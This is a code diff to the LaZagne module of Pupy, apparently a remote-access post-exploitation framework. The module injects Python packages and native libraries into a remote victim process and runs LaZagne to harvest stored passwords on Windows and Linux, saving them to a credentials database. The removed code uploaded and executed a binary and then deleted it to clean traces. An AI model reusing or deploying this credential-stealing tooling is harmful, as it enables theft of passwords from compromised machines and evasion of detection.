@@ -8,7 +8,8 @@ from pupylib.utils.credentials import Credentials
 import tempfile
 import subprocess
 import os.path
-from pupylib.utils.rpyc_utils import redirected_stdo
+import sys
+from pupylib.utils.rpyc_utils import redirected_stdio
 
 __class_name__="LaZagne"
 
@@ -22,85 +23,61 @@ class LaZagne(PupyModule):
         self.arg_parser.add_argument("-v", "--verbose", action='store_true')
 
     def run(self, args):
-        platform=self.client.desc["platform"]
+        ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",))
+        platform = self.client.desc["platform"]
+
         if "Windows" in platform:
             if "64" in self.client.desc["proc_arch"]:
                 arch = "amd64"
             else:
                 arch = "x86"
 
-            # load all dependency
-            self.client.load_dll(os.path.abspath(os.path.join(os.path.dirname(__file__),"..", "packages", "windows", arch, "sqlite3.dll")))
-            self.client.load_package("sqlite3")
-            self.client.load_package("_sqlite3")
-            self.client.load_package("xml")
-            self.client.load_package("_elementtree")
-            self.client.load_package("pyexpat")         # needed for _elementtree module
-            self.client.load_package("win32crypt")
-            self.client.load_package("win32api")
-            self.client.load_package("win32con")
-            self.client.load_package("win32cred")
-            self.client.load_package("colorama")
-            self.client.load_package("impacket")
-            self.client.load_package("calendar")
-            self.client.load_package("win32security")
-            self.client.load_package("win32net")
-            self.client.load_package("lazagne")
+            # load all dependencies
+            self.client.load_dll(os.path.abspath(os.path.join(ROOT, "packages", "windows", arch, "sqlite3.dll")))
+            py_to_load = ['sqlite3', '_sqlite3', 'xml', '_elementtree', 'pyexpat', 'win32crypt', 'win32api', 'win32con', 'win32cred', 'colorama', 'impacket', 'calendar', 'win32security', 'win32net']
+            for py in py_to_load:
+                self.client.load_package(py)
+                # self.success('%s loaded' % py)
 
-            db = Credentials()
-            
-            passwordsFound = False
-            moduleNames = self.client.conn.modules["lazagne.config.manageModules"].get_modules()
-            for module in moduleNames:
-                if args.verbose:
-                    self.info("running module %s"%(str(module).split(' ',1)[0].strip('<')))
-                passwords = module.run(module.options['dest'].capitalize())
-                if passwords:
-                    passwordsFound = True
-                    self.print_results(module.options['dest'].capitalize(), passwords, db)
-            
-            if not passwordsFound:
-                self.warning("no passwords found !")
-        
         elif "Linux" in platform:
-            isWindows = False
-            if "64" in self.client.desc["os_arch"]:
-                lazagne_path = self.client.pupsrv.config.get("lazagne","linux_64")
-            else:
-                lazagne_path = self.client.pupsrv.config.get("lazagne","linux_32")
-        
-            if not os.path.isfile(lazagne_path):
-                self.error("laZagne exe %s not found ! please edit laZagne section in pupy.conf"%lazagne_path)
-                self.error('Find releases on github: https://github.com/AlessandroZ/LaZagne/releases')
-                return
-            
-            tf = tempfile.NamedTemporaryFile()
-            dst = tf.name
-            tf.file.close()
+            py_to_load = ['sqlite3', 'pupyimporter', 'dbus', 'xml', 'etree']
+            for py in py_to_load:
+                self.client.load_package(py)
+                # self.success('%s loaded' % py)
 
-            self.success("Uploading laZagne to: %s" % dst)
-            upload(self.client.conn, lazagne_path, dst)
-            
-            self.success("Adding execution permission")
-            cmd = ["chmod", "+x", dst]
-            output = self.client.conn.modules.subprocess.check_output(cmd, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
-
-            self.success("Executing")
-            cmd = [dst, "all"]
-            output = self.client.conn.modules.subprocess.check_output(cmd, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
-            self.success("%s" % output)
-            
-            creds = self.parse_output(output)
-            db = Credentials()
-            db.add(creds)
-            self.success("Passwords stored on the database")
-            
-            self.success("Cleaning traces")
-            self.client.conn.modules['os'].remove(dst)
-
+            package_path = os.path.join(ROOT, "packages", "linux", 'all')
+            lib_to_load = [
+                {'fullname':'_sqlite3', 'content': '', 'extension':'so', 'is_pkg': False, 'path': os.path.join(package_path, "_sqlite3.so")}, 
+                {'fullname':'pyexpat', 'content': '', 'extension':'so', 'is_pkg': False, 'path': os.path.join(package_path, "pyexpat.so")},
+                {'fullname':'_elementtree', 'content': '', 'extension':'so', 'is_pkg': False, 'path': os.path.join(package_path, "_elementtree.so")},
+                {'fullname':'crypt', 'content': '', 'extension':'so', 'is_pkg': False, 'path': os.path.join(package_path, "crypt.so")},
+                {'fullname':'_dbus_bindings', 'content': '', 'extension':'so', 'is_pkg': False, 'path': os.path.join(package_path, "_dbus_bindings.so")}
+            ]
+            for lib in lib_to_load:
+                lib['content'] = open(lib['path'], 'rb').read()
+                obj = self.client.conn.modules["pupyimporter"].PupyPackageLoader(fullname=lib['fullname'], contents=lib['content'], extension=lib['extension'], is_pkg=lib['is_pkg'], path=lib['path'])
+                obj.load_module(lib['fullname'])
+                # self.success('%s loaded' % lib['fullname'])
         else:
             self.error("Platform not supported")
             return
+
+        # Run laZagne
+        self.client.load_package("lazagne")
+
+        # Launch all LaZagne modules
+        db = Credentials()
+        passwordsFound = False
+        moduleNames = self.client.conn.modules["lazagne.config.manageModules"].get_modules()
+        for module in moduleNames:
+            if args.verbose:
+                self.info("running module %s"%(str(module).split(' ',1)[0].strip('<')))
+            passwords = module.run(module.options['dest'].capitalize())
+            passwordsFound = True
+            self.print_results(module.options['dest'].capitalize(), passwords, db)
+        
+        if not passwordsFound:
+            self.warning("no passwords found !")
 
     def print_results(self, module, creds, db):
         if creds:
@@ -128,50 +105,3 @@ class LaZagne(PupyModule):
                 self.success("Passwords stored on the database")
             except Exception, e:
                 print e
-
-    def parse_output(self, output):
-        creds = []
-        toSave = False
-        ishashes = False
-        cpt = 0
-        user = ""
-        category = ""
-        for line in output.split('\n'):
-            if not toSave:
-                if "##########" in line:
-                    user='%s' % line.replace('##########', '').split(':')[1].strip()
-
-                if "---------" in line:
-                    category='%s' % line.replace('-', '').strip()
-
-                if " found !!!" in line and "not found !!!" not in line:
-                    toSave = True
-                    cred = {}
-            else:
-                if not line or line == '\r':
-                    if ishashes:
-                        cpt+=1
-                    if cpt > 1 or not ishashes:
-                        toSave = False
-                        ishashes = False
-                        if cred:
-                            cred['Tool']="LaZagne"
-                            cred['uid']=self.client.short_name()
-                            if user:
-                                cred['System user'] = user
-                            if category:
-                                cred['Category'] = category
-                            creds.append(cred)
-                else:
-                    # not store hashes => creddump already does it
-                    if not ishashes:
-                        if "hashes: " in line:
-                            ishashes = True
-                            cpt = 0
-                        else:
-                            try:
-                                key, value = line.split(':', 1)
-                                cred[key] = value.strip()
-                            except:
-                                pass
-        return creds
